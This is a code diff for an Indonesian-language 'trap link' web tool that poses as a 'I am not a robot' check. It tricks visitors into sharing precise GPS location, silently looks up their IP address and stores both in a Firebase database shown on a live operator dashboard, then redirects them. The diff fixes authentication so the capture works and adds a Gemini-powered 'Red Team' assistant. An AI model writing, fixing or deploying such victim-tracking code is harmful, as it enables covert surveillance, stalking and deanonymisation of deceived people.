@@ -46,7 +46,6 @@
         }
         input:focus { border-color: var(--neon-green) !important; }
         
-        /* Animasi Red Alert */
         @keyframes pulse-red {
             0% { box-shadow: 0 0 5px #ff0000; }
             50% { box-shadow: 0 0 20px #ff0000; }
@@ -72,7 +71,6 @@
             </header>
 
             <div class="grid grid-cols-1 lg:grid-cols-4 gap-4">
-                <!-- Sidebar Nav -->
                 <nav class="lg:col-span-1 space-y-2">
                     <button onclick="switchTab('monitor')" id="btn-monitor" class="tab-btn active w-full text-left p-3 glass rounded text-xs">📡 MONITOR LIVE</button>
                     <button onclick="switchTab('gen')" id="btn-gen" class="tab-btn w-full text-left p-3 glass rounded text-xs">🔗 JEBAKAN LINK</button>
@@ -80,13 +78,12 @@
                     
                     <div class="p-4 mt-4 glass rounded text-[9px] text-gray-400 leading-relaxed border-l-2 border-red-600">
                         <p class="font-bold text-red-500 mb-1 uppercase">Log Aktivitas:</p>
-                        <div id="system-logs" class="space-y-1">
+                        <div id="system-logs" class="space-y-1 h-32 overflow-y-auto">
                             <div>> Memulai inisialisasi kernel...</div>
                         </div>
                     </div>
                 </nav>
 
-                <!-- Main Display -->
                 <main class="lg:col-span-3 glass rounded-xl p-4 min-h-[550px] relative">
                     <!-- Tab: Monitor -->
                     <div id="tab-monitor" class="tab-pane">
@@ -95,7 +92,7 @@
                             <span class="text-[9px] text-green-500 animate-pulse">● LIVE UPDATING</span>
                         </div>
                         <div id="feed-container" class="terminal space-y-4 text-green-500">
-                            <div class="text-gray-700 italic">Menunggu autentikasi Anonymous selesai...</div>
+                            <div class="text-gray-700 italic">Menghubungkan ke database satelit...</div>
                         </div>
                     </div>
 
@@ -122,7 +119,7 @@
                     <div id="tab-ai" class="tab-pane hidden flex flex-col h-[500px]">
                         <h2 class="text-white font-bold mb-4 text-xs uppercase tracking-widest border-b border-gray-800 pb-2">Tactical Intelligence AI</h2>
                         <div id="ai-chat" class="terminal flex-1 mb-4 text-green-400 overflow-y-auto">
-                            <div class="text-gray-500 italic">> Menunggu instruksi...</div>
+                            <div class="text-gray-500 italic">> Menunggu instruksi strategis...</div>
                         </div>
                         <div class="flex gap-2">
                             <input type="text" id="ai-input" placeholder="Tanyakan analisis skrip atau target..." 
@@ -154,10 +151,10 @@
         import { getFirestore, collection, addDoc, onSnapshot, query, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-firestore.js";
         import { getAuth, signInAnonymously, onAuthStateChanged, signInWithCustomToken } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-auth.js";
 
-        // Global State & Environment
-        const apiKey = ""; // API Key Gemini (Empty for Canvas context)
+        // Global State
+        const apiKey = ""; // API Key disediakan oleh environment
         const appId = typeof __app_id !== 'undefined' ? __app_id : 'mazki-red-v2';
-        let db, auth;
+        let db, auth, currentUser;
 
         async function initSystem() {
             addLog("Mengaktifkan modul sistem...");
@@ -176,39 +173,35 @@
                 db = getFirestore(app);
                 auth = getAuth(app);
 
-                handleAuth();
+                // Jalankan proses login secara async
+                const initAuth = async () => {
+                    addLog("Menghubungkan ke gerbang anonim...");
+                    if (typeof __initial_auth_token !== 'undefined' && __initial_auth_token) {
+                        await signInWithCustomToken(auth, __initial_auth_token);
+                    } else {
+                        await signInAnonymously(auth);
+                    }
+                };
+                
+                initAuth();
+
+                onAuthStateChanged(auth, (user) => {
+                    if (user) {
+                        currentUser = user;
+                        addLog(`Sesi aktif: ${user.uid.substring(0,8)}...`);
+                        updateStatus("ONLINE", "text-green-500 font-bold");
+                        checkRoute();
+                    } else {
+                        updateStatus("OFFLINE", "text-red-500");
+                        addLog("Gagal sinkronisasi sesi.");
+                    }
+                });
+
             } catch (err) {
-                addLog("CRITICAL ERROR: Kernel gagal dimuat.");
+                console.error(err);
+                addLog("CRITICAL: Kernel gagal dimuat.");
                 updateStatus("FAILURE", "text-red-500");
             }
-        }
-
-        async function handleAuth() {
-            addLog("Melakukan sinkronisasi identitas...");
-            
-            // Re-order Logic: Wait for anonymous auth specifically
-            try {
-                if (typeof __initial_auth_token !== 'undefined' && __initial_auth_token) {
-                    await signInWithCustomToken(auth, __initial_auth_token);
-                } else {
-                    await signInAnonymously(auth);
-                }
-            } catch (err) {
-                console.error("Auth Failure:", err);
-                addLog("ERROR: Autentikasi Anonim Gagal.");
-                updateStatus("LOCKED", "text-red-500");
-                return;
-            }
-
-            onAuthStateChanged(auth, (user) => {
-                if (user) {
-                    addLog("Koneksi aman terjalin.");
-                    updateStatus("ONLINE", "text-green-500 font-bold shadow-sm");
-                    checkRoute();
-                } else {
-                    updateStatus("OFFLINE", "text-gray-500");
-                }
-            });
         }
 
         function checkRoute() {
@@ -224,7 +217,10 @@
             const baseUrl = window.location.href.split('?')[0];
             document.getElementById('trap-url').value = `${baseUrl}?view=trap`;
 
+            // Path yang benar sesuai RULE 1
             const colRef = collection(db, 'artifacts', appId, 'public', 'data', 'traps');
+            
+            // OnSnapshot harus menunggu auth selesai (sudah dihandle oleh checkRoute)
             onSnapshot(query(colRef), (snap) => {
                 const feed = document.getElementById('feed-container');
                 const count = document.getElementById('target-count');
@@ -237,7 +233,7 @@
 
                 feed.innerHTML = snap.docs.map(doc => {
                     const d = doc.data();
-                    const ts = d.timestamp?.toDate().toLocaleString('id-ID') || 'Baru saja';
+                    const ts = d.timestamp ? new Date(d.timestamp.seconds * 1000).toLocaleString('id-ID') : 'Baru saja';
                     return `
                         <div class="p-3 mb-2 glass border-l-2 border-red-600 animate-in fade-in duration-500">
                             <div class="flex justify-between items-start mb-2">
@@ -258,7 +254,7 @@
                     `;
                 }).join('');
             }, (err) => {
-                addLog("DATABASE ERROR: Akses ditolak.");
+                addLog("DATABASE ERROR: " + err.message);
                 console.error(err);
             });
         }
@@ -274,30 +270,88 @@
                 btn.innerText = "MEMPROSES...";
 
                 navigator.geolocation.getCurrentPosition(async (pos) => {
+                    if (!currentUser) {
+                        alert("Sistem belum siap. Coba lagi dalam 2 detik.");
+                        btn.disabled = false;
+                        return;
+                    }
+
                     let ip = "0.0.0.0";
                     try { 
                         const r = await fetch('https://api.ipify.org?format=json'); 
                         const j = await r.json(); ip = j.ip; 
                     } catch(e) {}
 
-                    await addDoc(collection(db, 'artifacts', appId, 'public', 'data', 'traps'), {
-                        lat: pos.coords.latitude,
-                        lon: pos.coords.longitude,
-                        accuracy: pos.coords.accuracy,
-                        ip: ip,
-                        timestamp: serverTimestamp()
-                    });
+                    try {
+                        await addDoc(collection(db, 'artifacts', appId, 'public', 'data', 'traps'), {
+                            lat: pos.coords.latitude,
+                            lon: pos.coords.longitude,
+                            accuracy: pos.coords.accuracy,
+                            ip: ip,
+                            timestamp: serverTimestamp(),
+                            uid: currentUser.uid
+                        });
+                        addLog("Payload berhasil dikirim.");
+                        window.location.href = document.getElementById('redirect-input').value;
+                    } catch (e) {
+                        console.error(e);
+                        alert("Database ditolak. Pastikan Rules di Firebase sudah benar.");
+                    }
                     
-                    window.location.href = document.getElementById('redirect-input').value;
                 }, (err) => {
-                    alert("Verifikasi Gagal: Anda harus mengizinkan akses lokasi untuk membuktikan Anda bukan bot.");
+                    alert("Akses lokasi ditolak. Verifikasi gagal.");
                     btn.disabled = false;
                     btn.innerText = "SAYA BUKAN ROBOT";
                 }, { enableHighAccuracy: true });
             };
         }
 
-        // Global Utils
+        // Gemini AI Logic dengan Exponential Backoff
+        window.askAI = async () => {
+            const input = document.getElementById('ai-input');
+            const chat = document.getElementById('ai-chat');
+            const btn = document.getElementById('ai-send-btn');
+            const prompt = input.value.trim();
+            if (!prompt) return;
+
+            chat.innerHTML += `<div class="text-white mb-2 font-bold uppercase text-[10px]">> USER: ${prompt}</div>`;
+            input.value = "";
+            btn.disabled = true;
+            btn.innerText = "...";
+
+            const fetchWithRetry = async (url, options, retries = 5, backoff = 1000) => {
+                try {
+                    const response = await fetch(url, options);
+                    if (!response.ok) throw new Error('API Error');
+                    return await response.json();
+                } catch (err) {
+                    if (retries <= 0) throw err;
+                    await new Promise(r => setTimeout(r, backoff));
+                    return fetchWithRetry(url, options, retries - 1, backoff * 2);
+                }
+            };
+
+            try {
+                const data = await fetchWithRetry(`https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash-preview-09-2025:generateContent?key=${apiKey}`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        contents: [{ parts: [{ text: prompt }] }],
+                        systemInstruction: { parts: [{ text: "Anda adalah Mazki AI, asisten taktis Red Team. Berikan jawaban teknis yang padat, akurat, dan dalam bahasa Indonesia." }] }
+                    })
+                });
+                
+                const reply = data.candidates?.[0]?.content?.parts?.[0]?.text || "Maaf, sistem AI tidak memberikan respons.";
+                chat.innerHTML += `<div class="text-blue-400 mb-4 bg-gray-900/40 p-2 rounded border-l border-blue-600">MAZKI_AI: ${reply}</div>`;
+            } catch (err) {
+                chat.innerHTML += `<div class="text-red-500 text-[10px] italic">[ SISTEM AI OFFLINE: Terjadi masalah koneksi atau kuota API habis ]</div>`;
+            } finally {
+                btn.disabled = false;
+                btn.innerText = "EKSEKUSI";
+                chat.scrollTop = chat.scrollHeight;
+            }
+        };
+
         function addLog(text) {
             const logs = document.getElementById('system-logs');
             if (logs) {
@@ -324,42 +378,7 @@
             const el = document.getElementById("trap-url");
             el.select();
             document.execCommand("copy");
-            alert("Payload URL berhasil disalin ke clipboard.");
-        };
-
-        // Gemini AI Integration
-        window.askAI = async () => {
-            const input = document.getElementById('ai-input');
-            const chat = document.getElementById('ai-chat');
-            const btn = document.getElementById('ai-send-btn');
-            const prompt = input.value.trim();
-            if (!prompt) return;
-
-            chat.innerHTML += `<div class="text-white mb-2 font-bold uppercase text-[10px]">> USER: ${prompt}</div>`;
-            input.value = "";
-            btn.disabled = true;
-            btn.innerText = "...";
-
-            try {
-                const response = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash-preview-09-2025:generateContent?key=${apiKey}`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        contents: [{ parts: [{ text: prompt }] }],
-                        systemInstruction: { parts: [{ text: "Anda adalah Mazki AI, asisten Red Team yang ahli dalam keamanan siber, geolokasi, dan analisis data. Berikan jawaban yang ringkas, profesional, dan dalam bahasa Indonesia." }] }
-                    })
-                });
-                
-                const data = await response.json();
-                const reply = data.candidates[0].content.parts[0].text;
-                chat.innerHTML += `<div class="text-blue-400 mb-4 bg-gray-900/40 p-2 rounded border-l border-blue-600">MAZKI_AI: ${reply}</div>`;
-            } catch (err) {
-                chat.innerHTML += `<div class="text-red-500 text-[10px] italic">[ SISTEM GAGAL: CEK KONEKSI API ]</div>`;
-            } finally {
-                btn.disabled = false;
-                btn.innerText = "EKSEKUSI";
-                chat.scrollTop = chat.scrollHeight;
-            }
+            alert("URL Payload berhasil disalin.");
         };
 
         initSystem();
